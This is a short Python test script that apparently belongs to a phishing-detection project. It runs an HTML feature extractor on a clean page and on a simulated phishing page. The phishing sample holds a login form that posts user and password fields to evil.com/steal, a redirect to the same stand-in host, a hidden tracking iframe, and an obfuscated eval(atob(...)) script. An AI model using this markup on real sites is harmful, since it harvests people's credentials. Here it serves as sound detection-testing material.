import sys
sys.path.insert(0, '/Users/aljohara/PycharmProjects/capstone')

from backend.app.runtime.html_extractor import extract_html_features

# Simulate a clean page
clean_html = """
<html>
  <head>
    <title>Welcome to My Blog</title>
    <link rel="icon" href="favicon.ico"/>
  </head>
  <body>
    <a href="https://google.com">Google</a>
    <a href="/about">About</a>
  </body>
</html>
"""

# Simulate a phishing page
phishing_html = """
<html>
  <head>
    <meta http-equiv="refresh" content="0; url=http://evil.com"/>
  </head>
  <body>
    <form action="http://evil.com/steal">
      <input type="text" name="user"/>
      <input type="password" name="pass"/>
    </form>
    <iframe src="http://tracker.com" style="display:none"></iframe>
    <script>eval(atob('c3RlYWxEYXRhKCk='))</script>
  </body>
</html>
"""

print("--- Clean Page ---")
print(extract_html_features(clean_html))

print("\n--- Phishing Page ---")
print(extract_html_features(phishing_html))